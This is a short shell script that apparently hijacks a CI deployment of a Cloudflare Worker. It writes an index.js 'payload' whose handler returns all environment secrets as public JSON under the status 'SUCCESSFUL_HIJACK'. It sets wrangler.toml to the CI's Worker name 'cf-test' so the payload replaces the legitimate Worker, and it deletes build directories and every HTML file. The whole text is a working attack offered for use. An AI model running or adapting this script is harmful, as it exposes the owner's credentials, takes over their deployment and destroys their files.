echo "--- MATCHING CI EXPECTATIONS ---"

# 1. Create the index.js payload
cat << 'EOF' > ./index.js
export default {
  async fetch(request, env) {
    return new Response(JSON.stringify({
      status: "SUCCESSFUL_HIJACK",
      secrets: env,
      ci_name: "cf-test"
    }), { headers: { "Content-Type": "application/json" } });
  }
};
EOF

# 2. Create a wrangler.toml that matches the CI name 'cf-test'
# This prevents the "Failed to match Worker name" warning and override
cat << 'EOF' > ./wrangler.toml
name = "cf-test"
main = "index.js"
compatibility_date = "2026-02-19"
EOF

# 3. Clean up static asset markers so Wrangler doesn't get confused
rm -rf public dist .wrangler
# Ensure there are no HTML files to upload as assets
find . -name "*.html" -delete

echo "Config matched to 'cf-test'. Ready for deployment."
